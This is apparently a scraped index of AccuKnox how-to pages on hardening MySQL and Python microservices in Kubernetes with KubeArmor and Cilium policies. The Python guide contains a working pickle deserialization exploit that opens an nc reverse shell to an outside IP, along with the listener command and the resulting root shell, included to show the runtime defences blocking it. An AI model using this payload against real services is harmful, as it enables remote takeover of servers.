mysql-69559dfd5d-nzmcd Container ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677 Container Name: mysql Severity: ksp-restrict-access-mysql-server-config Tags: 5 Message: MYSQL,config-files,mysqldump Type: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used. Source: MatchedPolicy Operation: /bin/cat /etc/mysql/my.cnf Resource: File Data: /etc/mysql/my.cnf Action: syscall = SYS_OPENAT fd = -100 flags = /etc/mysql/my.cnf Result: Audit Securing configuration files are a necessity for any application. With KubeArmor you can effectively do that and with the options like readOnly , ownerOnly , recursive, matchDirectoriesetc you can fine-tune the policy enforcement. See more KubeArmor Policy Specification Protect Using Auto Discovered Policies \u00b6 AccuKnox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies. Select Policy Manager -> Auto Discovered Policies We deployed our sample application on the default namespace. Check default namespace for policies Following are the auto-discovered policies generated by AccuKnox . Let's briefly explain the policies. apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-ingress-anvyjxzgmiqcyws spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : mysql8 ingress : - fromEndpoints : - matchLabels : app : apache k8s:io.kubernetes.pod.namespace : default toPorts : - ports : - port : \"3306\" protocol : TCP This policy will be enforced at the ingress (against the inbound network flows) of the MySQL pod (pods labeled with app: mysql8 will be picked). This enables endpoints with the label app: apache and k8s:io.kubernetes.pod.namespace: default to communicate with all endpoints with the label app: mysql8, but they must share using TCP on port 3306. Endpoints with other labels will not communicate with the MySQL pod. apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-egress-nqfbfchvptougbs spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : apache egress : - toEndpoints : - matchLabels : app : mysql8 k8s:io.kubernetes.pod.namespace : default toPorts : - ports : - port : \"3306\" protocol : TCP This policy is very similar to the first policy. This will be enforced at the webserver pod's egress (against the outbound network flows) (pods labelled with the app: apache will be picked). apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-egress-xkvuxpmcxgtpacv spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : apache egress : - toEndpoints : - matchLabels : k8s-app : kube-dns k8s:io.kubernetes.pod.namespace : kube-system toPorts : - ports : - port : \"53\" protocol : UDP This one is the DNS policy for the webserver pod. All these policies are generated based on the network flow of the sample application. It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and reduce the application's attack surface. Conclusion \u00b6 Auto-discovered policies are generated based on the network flow of the application. It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and provide runtime security. You can also handcraft your own security policies to secure your MySQL cluster. KubeArmor Slack : Join the KubeArmor community on Slack! Now you can protect your workloads in minutes using AccuKnox , it is available to protect your Kubernetes and other cloud workloads using Kernel Native Primitives such as AppArmor, SELinux, and eBPF. Let us know if you are seeking additional guidance in planning your cloud security program.","title":"How to protect MySQL application with AccuKnox"},{"location":"how-to/protect-mysql-application/#prerequisites","text":"Install open-source AccuKnox tools to your cloud environment. Run the following script to install Daemon sets and Services curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash For more details, check this help page or Use the enterprise tier of the AccuKnox product","title":"Prerequisites"},{"location":"how-to/protect-mysql-application/#deploy-sample-phpmysql-web-application-in-kubernetes","text":"We will create two deployments; one for the webserver and the other for MySQL DB. The web server will read data from MySQL DB and show it in the browser. Here we have used the GKE environment. [Step 1] Clone GitHub Repo git clone https://github.com/accuknox/samples.git cd samples/php-mysql-webapp [Step 2] Deploy Web server kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver.yaml Run kubectl get pods in the terminal to get the response: You should be able to see the output like this: NAME READY STATUS RESTARTS AGE webserver-55f99f9ffb-f4rvk 1 /1 Running 0 2d3h Alright, the pod is created but we can\u2019t access it despite having its IP, the reason is that the Pod IP is not public. So we use service . When a user tries to access an app, for instance, a web server here, it actually makes a request to a service which itself then checks where it should forward the request. Now to access the webserver you will just access the IP and port as defined in the service configuration file. [Step 3] Now let's deploy web-service kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver-svc.yaml Check the status of the service kubectl get svc You should be able to see the output like this NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kubernetes ClusterIP 10 .16.0.1 <none> 443 /TCP 27d web-service LoadBalancer 10 .16.9.151 35 .193.121.214 80 :31533/TCP 2d3h [Step 4] Create the persistent volume claim to keep your data intact. [Step 5] Create deployment and service for MySQL DB. kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql.yaml Check the status of the pod and service kubectl get po,svc You should be able to see the output like this NAME READY STATUS RESTARTS AGE pod/mysql-796674bfb-dl495 1 /1 Running 0 115s pod/webserver-5f7dbd89d6-5ng7r 1 /1 Running 0 19m pod/webserver-5f7dbd89d6-hnrz9 1 /1 Running 0 19m pod/webserver-5f7dbd89d6-pmw4s 1 /1 Running 0 19m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE service/kubernetes ClusterIP 10 .8.0.1 <none> 443 /TCP 32m service/mysql8-service ClusterIP 10 .8.1.249 <none> 3306 /TCP 27s service/web-service LoadBalancer 10 .8.0.92 34 .70.234.72 80 :32209/TCP 14m Now the application is deployed. You can insert data into the database in two ways. You can use a MySQL Client or directly execute to the MySQL server pod. Connect using a MySQL client: kubectl run -it --rm --image = mysql:5.6 --restart = Never mysql-client -- mysql -h mysql8-service -p.sweetpwd. You should be able to see the output like this $ kubectl run -it --rm --image = mysql:5.6 --restart = Never mysql-client -- mysql -h mysql8-service -p.sweetpwd. If you don ' t see a command prompt, try pressing enter. mysql> Directly executing into MySQL pod: kubectl exec -it mysql-796674bfb-dl495 -- bash Note: Replace mysql-796674bfb-dl495 with your mysql pod name. Now you are inside MySQL pod. Use the below command to enter the MySQL command prompt. mysql -u root -p.sweetpwd. You should be able to see the output like this $ kubectl exec -it mysql-69559dfd5d-nzmcd -- bash root@mysql-69559dfd5d-nzmcd:/# mysql -u root -p.sweetpwd. mysql: [ Warning ] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g . Your MySQL connection id is 10 Server version: 8 .0.28 MySQL Community Server - GPL Copyright ( c ) 2000 , 2022 , Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> Now you are inside the MySQL terminal. First, you need to create a users table and add values to the table. Use the below commands to do that. SHOW DATABASES ; You should be able to see the output like this USE my_db ; You should be able to see the output like this CREATE TABLE users ( name varchar ( 20 ) ); You should be able to see the output like this INSERT INTO users ( name ) VALUES ( 'John' ); Now check the external IP of the web service. If everything works well, you'll see this screen with the name John.","title":"Deploy Sample PHP/MySQL Web application in Kubernetes"},{"location":"how-to/protect-mysql-application/#working-with-open-source-accuknox-tools","text":"The policy-templates open-source repository provides policy templates based on KubeArmor and Cilium policies for known CVEs and attacks vectors, compliance frameworks such as PCI-DSS, MITRE, STIG, NIST, CIS, etc., popular workloads such as GoLang, Python, PostgreSQL, Cassandra, MySQL, WordPress, etc. We hope that you also contribute by sending policy templates via pull requests or Github issues to grow the list. Go to GitHub repository: https://github.com/kubearmor/policy-templates AccuKnox provides a number of policy templates for your MySQL workloads. Let's see a policy from the policy templates repo.","title":"Working with Open-Source AccuKnox tools"},{"location":"how-to/protect-mysql-application/#audit-your-mysql-server-sensitive-configuration-files-with-kubearmor","text":"MySQL Server, also known as mysqld, is a single multithreaded program that does most of the work in a MySQL installation. It does not spawn additional processes. MySQL Server manages access to the MySQL data directory that contains databases and tables. The data directory is also the default location for other information such as log files and status files.","title":"Audit your MySQL Server Sensitive Configuration files with KubeArmor"},{"location":"how-to/protect-mysql-application/#i-mycnf","text":"The default configuration file is called my.cnf and can be located in a number of directories. On Linux and other Unix related platforms, the locations are using /etc/my.cnf, /etc/mysql/my.cnf, /var/lib/mysql/my.cnf or in the default installation directory. This file contains configuration settings that will be loaded when the server starts, including settings for the clients, server, mysqld_safe wrapper and various other MySQL client programs. However, if they're not there, you can use mysqld to find the configuration. Run the following command inside the MySQL server pod. mysqld --help --verbose The first part of the lengthy response describes the options you can send to the server when you launch it. The second part displays the configuration settings during the server compilation. Near the start of the output, find a couple of lines that look similar to the following example: Starts the MySQL database server . Usage : mysqld [ OPTIONS ] Default options are read from the following files in the given order : / etc / my . cnf / etc / mysql / my . cnf ~/ . my . cnf The following groups are read : mysqld server mysqld - 8 . 0","title":"(i) my.cnf:"},{"location":"how-to/protect-mysql-application/#ii-my-newcnf","text":"This file is created when there is an existing my.cnf file and the mysql_install_db script is running. The mysql_install_db script is designed to develop the my.cnf file if it does not exist. If the file does exist, then the file is created using the name my-new.cnf to avoid overwriting an existing configuration file. It is then up to the user to compare the two, determine files and determine which options are still valid, for the new install and change the files as required to get the new my.cnf configuration file.","title":"(ii) my-new.cnf"},{"location":"how-to/protect-mysql-application/#iii-log-files","text":"By default, MySQL stores its log files in the following directory: / var / log / mysql Check the MySQL configuration if you don't find the MySQL logs in the default directory. View the my.cnf file and look for a log_error line, as in: log_error = / var / log / mysql / error . log","title":"(iii) Log files"},{"location":"how-to/protect-mysql-application/#iv-backups","text":"The two main options are to copy the database files or use mysqldump as follows:","title":"(iv) Backups"},{"location":"how-to/protect-mysql-application/#file-copy","text":"By default, MySQL creates a directory for each database in its data directory, /var/lib/mysql . Note: Ensure you set the permissions on that file to restrict read access for password-security reasons.","title":"File copy"},{"location":"how-to/protect-mysql-application/#mysqldump","text":"Another approach to backing up your database is to use the mysqldump tool. Rather than copying the database files directly, mysqldump generates a text file that represents the database. By default, the text file contains a list of SQL statements to recreate the database, but you can also export the database in another format like .CSV or .XML . You can read the man page for mysqldump to see all its options. The statements generated by mysqldump go straight to standard output. You can specify a to redirect the output by running the following command in the command line: This command tells mysqldump to recreate the demodb database in SQL statements and to write them to the file dbbackup.sql . Note that the username and password options function the same as the MySQL client to include the password directly after -p in a script. With the help of KubeArmor and Policy-templates, You can audit/restrict all these sensitive configuration files and processes that use these files easily.","title":"mysqldump"},{"location":"how-to/protect-mysql-application/#following-kubearmor-policy-will-audit-configuration-files-and-block-mysqldump-command","text":"# KubeArmor is an open source software that enables you to protect your cloud workload at runtime. # To learn more about KubeArmor visit: # https://www.accuknox.com/kubearmor/ apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-restrict-access-mysql-server-config namespace : default # Change your namespace spec : tags : [ \"MYSQL\" , \"config-files\" , \"mysqldump\" ] message : \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\" selector : matchLabels : app : mysql8 # Change your labels file : severity : 5 matchPaths : - path : /etc/mysql/my.cnf ownerOnly : true matchDirectories : - dir : /etc/mysql/ recursive : true ownerOnly : true - dir : /var/lib/mysql/ readOnly : true recursive : true - dir : /var/log/mysql/ recursive : true action : Audit process : severity : 10 matchPaths : - path : /usr/bin/mysqldump action : Block Apply KubeArmor Security Policy (KSP) from the Policy templates and perform following steps: Go to Policy templates GitHub Repository. Check MySQL folder then copy the URL of the policy raw file. Apply it using kubectl apply command. kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml Use mysqldump command: kubectl exec -it mysql-69559dfd5d-nzmcd -- bash root@mysql-7d9977c67d-57mrx:/# mysqldump -u db_user -p .mypwd my_db users > dumpfilename.sql Note: Replace mysql-69559dfd5d-nzmcd with your mysql pod name. You should be able to see the output like this root@mysql-69559dfd5d-nzmcd:/# mysqldump -u db_user -p .mypwd my_db users > dumpfilename.sql bash: /usr/bin/mysqldump: Permission denied root@mysql-69559dfd5d-nzmcd:/#","title":"Following KubeArmor policy will Audit configuration files and block mysqldump command."},{"location":"how-to/protect-mysql-application/#view-kubearmor-logs","text":"a. Enable port-forwarding for KubeArmor relay kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 b. Observing logs using karmor CLI karmor log You should be able to see the output like this gRPC server: localhost:32767 Created a gRPC client ( localhost:32767 ) Checked the liveness of the gRPC server Started to watch alerts == Alert / 2022 -02-08 03 :10:05.867619 == Cluster Name: default Host Name: gke-cys-feb8-default-pool-4852bc33-rmcr Namespace Name: default Pod Name: mysql-69559dfd5d-nzmcd Container ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677 Container Name: mysql Severity: ksp-restrict-access-mysql-server-config Tags: 10 Message: MYSQL,config-files,mysqldump Type: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used. Source: MatchedPolicy Operation: /bin/bash Resource: Process Data: /usr/bin/mysqldump -u db_user -p .mypwd my_db users Action: syscall = SYS_EXECVE Result: Block Accessing /etc/mysql/my.cnf config. file; root@mysql-7d9977c67d-7rcmb:/# cat /etc/mysql/my.cnf KubeArmor detects this event and you will receive logs like this: Check karmor log == Alert / 2022 -02-08 03 :12:40.413064 == Cluster Name: default Host Name: gke-cys-feb8-default-pool-4852bc33-rmcr Namespace Name: default Pod Name: mysql-69559dfd5d-nzmcd Container ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677 Container Name: mysql Severity: ksp-restrict-access-mysql-server-config Tags: 5 Message: MYSQL,config-files,mysqldump Type: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used. Source: MatchedPolicy Operation: /bin/cat /etc/mysql/my.cnf Resource: File Data: /etc/mysql/my.cnf Action: syscall = SYS_OPENAT fd = -100 flags = /etc/mysql/my.cnf Result: Audit Securing configuration files are a necessity for any application. With KubeArmor you can effectively do that and with the options like readOnly , ownerOnly , recursive, matchDirectoriesetc you can fine-tune the policy enforcement. See more KubeArmor Policy Specification","title":"View KubeArmor logs:"},{"location":"how-to/protect-mysql-application/#protect-using-auto-discovered-policies","text":"AccuKnox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies. Select Policy Manager -> Auto Discovered Policies We deployed our sample application on the default namespace. Check default namespace for policies Following are the auto-discovered policies generated by AccuKnox . Let's briefly explain the policies. apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-ingress-anvyjxzgmiqcyws spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : mysql8 ingress : - fromEndpoints : - matchLabels : app : apache k8s:io.kubernetes.pod.namespace : default toPorts : - ports : - port : \"3306\" protocol : TCP This policy will be enforced at the ingress (against the inbound network flows) of the MySQL pod (pods labeled with app: mysql8 will be picked). This enables endpoints with the label app: apache and k8s:io.kubernetes.pod.namespace: default to communicate with all endpoints with the label app: mysql8, but they must share using TCP on port 3306. Endpoints with other labels will not communicate with the MySQL pod. apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-egress-nqfbfchvptougbs spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : apache egress : - toEndpoints : - matchLabels : app : mysql8 k8s:io.kubernetes.pod.namespace : default toPorts : - ports : - port : \"3306\" protocol : TCP This policy is very similar to the first policy. This will be enforced at the webserver pod's egress (against the outbound network flows) (pods labelled with the app: apache will be picked). apiVersion : cilium.io/v2 kind : CiliumNetworkPolicy metadata : name : autopol-egress-xkvuxpmcxgtpacv spec : description : Auto Discovered Policy endpointSelector : matchLabels : app : apache egress : - toEndpoints : - matchLabels : k8s-app : kube-dns k8s:io.kubernetes.pod.namespace : kube-system toPorts : - ports : - port : \"53\" protocol : UDP This one is the DNS policy for the webserver pod. All these policies are generated based on the network flow of the sample application. It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and reduce the application's attack surface.","title":"Protect Using Auto Discovered Policies"},{"location":"how-to/protect-mysql-application/#conclusion","text":"Auto-discovered policies are generated based on the network flow of the application. It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and provide runtime security. You can also handcraft your own security policies to secure your MySQL cluster. KubeArmor Slack : Join the KubeArmor community on Slack! Now you can protect your workloads in minutes using AccuKnox , it is available to protect your Kubernetes and other cloud workloads using Kernel Native Primitives such as AppArmor, SELinux, and eBPF. Let us know if you are seeking additional guidance in planning your cloud security program.","title":"Conclusion"},{"location":"how-to/protect-python-microservice/","text":"How to Protect Python micro-services using AccuKnox? \u00b6 Introduction \u00b6 Today's complex systems are highly distributed. Since components communicate with each other and share information (such as shifting data between services, storing information, etc.), the native binary format is not ideal. We use serialization to transform this binary data into a string (ASCII characters) so that it can be moved using standard protocols. Serialization operations are extremely frequent in architectures that include APIs, microservices, and client-side MVC. When the data under serialization and deserialization are reliable (under the control of the system), there is no risk. Oftentimes, developers tend to import third-party libraries that are relatively easy to use. Doing so, they unknowingly introduce vulnerabilities through these shared third-party libraries and modules. In this blog, we're going to have a closer look at Insecure Deserialization. Insecure deserialization is a type of vulnerability that occurs when an attacker is able to manipulate the serialized object and result in unintended consequences in the program's flow. This may lead to a DoS, authentication bypass, or even an RCE. Let's take a look at a python microservice with some insecure modules. We will also discuss how to protect (at runtime) against such vulnerabilities using AccuKnox . Setting up a Python microservice to demonstrate runtime security \u00b6 In this blog, we will demonstrate how to protect your Python microservices against such threats by implementing runtime security tools from AccuKnox. These will analyze the application and generate policies that can be enforced by Linux Security Modules (LSMs) like AppArmor and SELinux. Let's create a microservice for online file uploads. We will define an API for them and write the Python code which implements them in the form of microservices. To keep things manageable, we\u2019ll define only two microservices: Pickle-app \u2013 the main program which takes in the uploaded files as input and stores them in a MySQL database. MySQL \u2013 the storage part for pickle-app You can see that the user will interact with the pickle-app microservice via their browser, and the pickle-app microservice will interact with the MySQL microservice. The scenario's purpose is to demonstrate how AccuKnox opensource tools can be used to implement zero trust in an environment. \u00b6 Let's create a Kubernetes cluster gcloud container clusters create sample-cluster --zone us-central1-c Once the cluster is up and running we will deploy the application on a Kubernetes cluster and onboard the cluster to AccuKnox . kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/python-flask/k8s.yaml We\u2019ll also get the external IP for the python flask application using the following command: kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kubernetes ClusterIP 10 .16.0.1 <none> 443 /TCP 9h pickle-svc LoadBalancer 10 .16.0.23 34 .123.162.173 80 /TCP 9h For detailed steps on how to onboard your cluster kindly go through our help section . The full code for the microservice can be found on this GitHub repo Runtime protection using AccuKnox Open-source tools \u00b6 AccuKnox enables the ability to protect your workloads at runtime. AccuKnox enables this by allowing you to configure policies (or auto-discover them) for application and network behavior using KubeArmor , Cilium , and Auto Policy Discovery tools KubeArmor KubeArmor , an open-source software that enables you to protect your cloud workload at runtime. The problem that KubeArmor solves is that it can prevent cloud workloads from executing malicious activity at runtime. Malicious activity can be any activity that the workload was not designed for or is not supposed to do. Cilium Cilium , an open-source project to provide eBPF-based networking, security, and observability for cloud-native environments such as Kubernetes clusters and other container orchestration platforms. Auto Policy Discovery for your Python microservice \u00b6 Even though writing KubeArmor and Cilium (System and Network) policies are not a big challenge AccuKnox opensource has it simplified one step further by introducing a new CLI tool for Auto Discovered Policies . The Auto-Discovery module helps users by identifying the flow and generating policies based on it. Discovering policies has never been better with Auto Discovery. In two simple commands, you can set up and generate policies without having any trouble. We will use AccuKnox Auto Discovered Policies to generate zero-trust runtime security policies to secure our workload. The auto-discovered zero trust runtime security policies can be generated using two commands. We will have to deploy Cilium and KubeArmor to the cluster and use a MySQL pod to store the discovered policies from where they can be downloaded with a single command. First, we will use the below command to install all prerequisites. curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash ` Once the command is run successfully it will install the following components to your cluster: KubeArmor protection engine Cilium CNI Auto policy discovery engine MySQL database to keep discovered policies Hubble Relay and KubeArmor Relay Once this is down we can invoke the second script file which will download the auto-discovered policies from the MySQL database and store them locally. For this we will issue the below command: curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash ` You should be able to see the following output. Got 1 cilium policies in file cilium_policies.yaml Got 1 kubearmor policies in file kubearmor_policies_default_explorer_knoxautopolicy_fxbpvndp.yaml Got 1 kubearmor policies in file kubearmor_policies_default_explorer_mysql_xaqsryye.yaml Got 1 kubearmor policies in file kubearmor_policies_default_python-ms_pickle-app_engncdqs.yaml` In mere seconds after installing executing auto policy discovery tool, it generated 1 Cilium policy and 3 curated KubeArmor policies. Let us take a look at some of the autodiscovery policies Cilium Policy apiVersion: cilium.io/v2 kind: CiliumNetworkPolicy metadata: name: autopol-egress-fdjkltpvf namespace: default spec: endpointSelector: matchLabels: app: pickle-app ingress: - fromEndpoints: toPorts: - ports: - port: \"80\" protocol: TCP KubeArmor Policy apiVersion: security.kubearmor.com/v1 kind: KubeArmorPolicy metadata: name: autopol-system-269415943 namespace: default spec: severity: 1 selector: matchLabels: app: pickle-app file: matchPaths: - path: /app/templates/index.html fromSource: - path: /usr/bin/python3.8 - path: /app/templates/layout.html fromSource: - path: /usr/bin/python3.8 - path: /app/templates/uploads.html fromSource: - path: /usr/bin/python3.8 - path: /usr/lib/python3.8/encodings/__pycache__/unicode_escape.cpython-38.pyc fromSource: - path: /usr/bin/python3.8 action: Allow Note Policy name will change according to environment We also have predefined policies in the policy-template GitHub repository which can be utilized to achieve the same level of runtime security without having to generate autodiscovery policies. The only point to remember is that you need to know the namespace and labels for your Python workloads The Policies in-action \u00b6 It is time to verify whether we were able to achieve zero trust by using the auto-discovered policies generated by AccuKnox opensource tools. To test this we will scan the application with some popular scanners. Before that let us verify that the policies are applied correctly to the cluster kubectl get cnp,ksp -A NAMESPACE NAME AGE default ciliumnetworkpolicy.cilium.io/autopol-egress-fdjkltpvf 15m NAMESPACE NAME AGE default kubearmorpolicy.security.kubearmor.com/autopol-system-269415943 14m Initiating the Attack scenario \u00b6 By using Burpsuite as initial recon, we were able to determine that it is running on a python server and the API name gave away that it uses the pickle module. We\u2019ll make use of the pickle module and write a python exploit that lets us create a reverse shell onto the pod. Create a python file and name it exploit.py and then we'll create our class RCE and let its reduce method return a tuple of arguments for the callable object. import pickle import base64 import os class RCE : def __reduce__ ( self ): cmd = ( 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | nc 34.125.245.75 4444 > /tmp/f' ) return os . system , ( cmd ,) if __name__ == '__main__' : pickled = pickle . dumps ( RCE ()) with open ( 'parrot.pkl' , 'wb' ) as f : pickle . dump ( RCE (), f ) print ( base64 . urlsafe_b64encode ( pickled )) Our callable will be os.system and the argument will be a common reverse shell snippet using a named pipe. Let's create a .pkl file and upload it to the application via UI. Before executing let's take a look at the exploit file itself. cat exploit . py import pickle import base64 import os class RCE : def __reduce__ ( self ): cmd = ( 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh 2>&1 1 nc 34.125.245.75 4444 > /tmp/f' ) return os . system , ( cmd ,) if name == '__main__'' pickled = pickle . dumps ( RCE ()) with open ( 'parrotl.pkl' , 'wb'') as f: pickle . dump ( RCE (), f ) print ( base64 . urlsafe_b64encode ( pickled )) Time to create our python exploit payload. python3 exploit.py b 'gA5VcgAAAAAAAACMBXByc2l4lIwGc3lzdUtlJOUjEdyb5AydGlwL2Y7IG1r2mlmbyAydGlwL2Y7IGNhdCAydGlwL2YgfC 1wL2aUliZR5lC4=' We will use nc -lnvp 4444 command to listen to incoming connection on port 4444. nc -lnvp 4444 listening on [ any ] 4444 ... We\u2019ll go to http://34.123.162.173/upload_pickle and upload the exploit file parrot.pkl which we created earlier. We\u2019ll get a success message file upload successfully without a reverse shell opened on the listener machine. nc -lnvp 4444 listening on [ any ] 4444 ... Checking the policy logs on KubeArmor \u00b6 To check how to do it, kindly go through our help section Blocked Log Created by KubeArmor { \"timestamp\" : 1638223573 , \"updatedTime\" : \"2021-11-29T22:06:13.493285Z\" , \"hostName\" : \"gke-sample-cluster-default-pool-3be49535-k4cp\" , \"namespaceName\" : \"default\" , \"podName\" : \"pickle-app-6d8c67b4f6-fk2qs\" , \"containerID\" : \"9e57f01622b423e04bb2071d54f95dca2044a3f8467e897c5b696307a6080be7\" , \"containerName\" : \"pickle-app\" , \"hostPid\" : 1158108 , \"ppid\" : 370 , \"pid\" : 371 , \"uid\" : 0 , \"policyName\" : \"autopol-system-269415943\" , \"severity\" : \"1\" , \"type\" : \"MatchedPolicy\" , \"source\" : \"python3\" , \"operation\" : \"Process\" , \"resource\" : \"/bin/sh -c rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 34.125.245.75 4444 > /tmp/f\" , \"data\" : \"syscall=SYS_EXECVE\" , \"action\" : \"Block\" , \"result\" : \"Permission denied\" } Now let us delete the policies which we applied after auto discovering and run the scenario once more kubectl apply delete cnp,ksp --all ciliumnetworkpolicy.cilium.io \"autopol-egress-fdjkltpvf\" deleted kubearmorpolicy.security.kubearmor.com \"autopol-system-269415943\" deleted We\u2019ll go to http://34.123.162.173/upload_pickle and upload the same exploit file parrot.pkl The moment we upload the parrot.pkl file we will get a reverse shell opened on the listener machine. nc -lnvp 4444 listening on [ any ] 4444 ... connect to [ 10 .182.0.13 ] from ( UNKNOWN ) [ 35 .184.238.249 ] 38292 /bin/sh: 0 : can ' t access tty ; job control turned off # whoami root #hostname pickle-app-7f7fbdb76b-64mq5 We could see that the attack happened after we deleted the policies which were auto-discovered in a safe environment. This means applying the auto-discovered policies ensured that the workload had been protected at runtime. AccuKnox's policy templates repository \u00b6 AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit policy-templates to download and apply policies. Conclusion \u00b6 Insecure deserialization is very difficult to identify while conducting security tests. Insecure deserialization can be prevented by going through the source code for the vulnerable code base and by input validation and output sanitization. Insecure deserialization in conjunction with a Remote Code Execution (RCE) will undoubtedly compromise the entire infrastructure. Using KubeArmor, an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.","title":"How to protect Python microservices using AccuKnox"},{"location":"how-to/protect-python-microservice/#how-to-protect-python-micro-services-using-accuknox","text":"","title":"How to Protect Python micro-services using AccuKnox?"},{"location":"how-to/protect-python-microservice/#introduction","text":"Today's complex systems are highly distributed. Since components communicate with each other and share information (such as shifting data between services, storing information, etc.), the native binary format is not ideal. We use serialization to transform this binary data into a string (ASCII characters) so that it can be moved using standard protocols. Serialization operations are extremely frequent in architectures that include APIs, microservices, and client-side MVC. When the data under serialization and deserialization are reliable (under the control of the system), there is no risk. Oftentimes, developers tend to import third-party libraries that are relatively easy to use. Doing so, they unknowingly introduce vulnerabilities through these shared third-party libraries and modules. In this blog, we're going to have a closer look at Insecure Deserialization. Insecure deserialization is a type of vulnerability that occurs when an attacker is able to manipulate the serialized object and result in unintended consequences in the program's flow. This may lead to a DoS, authentication bypass, or even an RCE. Let's take a look at a python microservice with some insecure modules. We will also discuss how to protect (at runtime) against such vulnerabilities using AccuKnox .","title":"Introduction"},{"location":"how-to/protect-python-microservice/#setting-up-a-python-microservice-to-demonstrate-runtime-security","text":"In this blog, we will demonstrate how to protect your Python microservices against such threats by implementing runtime security tools from AccuKnox. These will analyze the application and generate policies that can be enforced by Linux Security Modules (LSMs) like AppArmor and SELinux. Let's create a microservice for online file uploads. We will define an API for them and write the Python code which implements them in the form of microservices. To keep things manageable, we\u2019ll define only two microservices: Pickle-app \u2013 the main program which takes in the uploaded files as input and stores them in a MySQL database. MySQL \u2013 the storage part for pickle-app You can see that the user will interact with the pickle-app microservice via their browser, and the pickle-app microservice will interact with the MySQL microservice.","title":"Setting up a Python microservice to demonstrate runtime security"},{"location":"how-to/protect-python-microservice/#the-scenarios-purpose-is-to-demonstrate-how-accuknox-opensource-tools-can-be-used-to-implement-zero-trust-in-an-environment","text":"Let's create a Kubernetes cluster gcloud container clusters create sample-cluster --zone us-central1-c Once the cluster is up and running we will deploy the application on a Kubernetes cluster and onboard the cluster to AccuKnox . kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/python-flask/k8s.yaml We\u2019ll also get the external IP for the python flask application using the following command: kubectl get svc NAME TYPE CLUSTER-IP EXTERNAL-IP PORT ( S ) AGE kubernetes ClusterIP 10 .16.0.1 <none> 443 /TCP 9h pickle-svc LoadBalancer 10 .16.0.23 34 .123.162.173 80 /TCP 9h For detailed steps on how to onboard your cluster kindly go through our help section . The full code for the microservice can be found on this GitHub repo","title":"The scenario's purpose is to demonstrate how AccuKnox opensource tools can be used to implement zero trust in an environment."},{"location":"how-to/protect-python-microservice/#runtime-protection-using-accuknox-open-source-tools","text":"AccuKnox enables the ability to protect your workloads at runtime. AccuKnox enables this by allowing you to configure policies (or auto-discover them) for application and network behavior using KubeArmor , Cilium , and Auto Policy Discovery tools KubeArmor KubeArmor , an open-source software that enables you to protect your cloud workload at runtime. The problem that KubeArmor solves is that it can prevent cloud workloads from executing malicious activity at runtime. Malicious activity can be any activity that the workload was not designed for or is not supposed to do. Cilium Cilium , an open-source project to provide eBPF-based networking, security, and observability for cloud-native environments such as Kubernetes clusters and other container orchestration platforms.","title":"Runtime protection using AccuKnox Open-source tools"},{"location":"how-to/protect-python-microservice/#auto-policy-discovery-for-your-python-microservice","text":"Even though writing KubeArmor and Cilium (System and Network) policies are not a big challenge AccuKnox opensource has it simplified one step further by introducing a new CLI tool for Auto Discovered Policies . The Auto-Discovery module helps users by identifying the flow and generating policies based on it. Discovering policies has never been better with Auto Discovery. In two simple commands, you can set up and generate policies without having any trouble. We will use AccuKnox Auto Discovered Policies to generate zero-trust runtime security policies to secure our workload. The auto-discovered zero trust runtime security policies can be generated using two commands. We will have to deploy Cilium and KubeArmor to the cluster and use a MySQL pod to store the discovered policies from where they can be downloaded with a single command. First, we will use the below command to install all prerequisites. curl -s 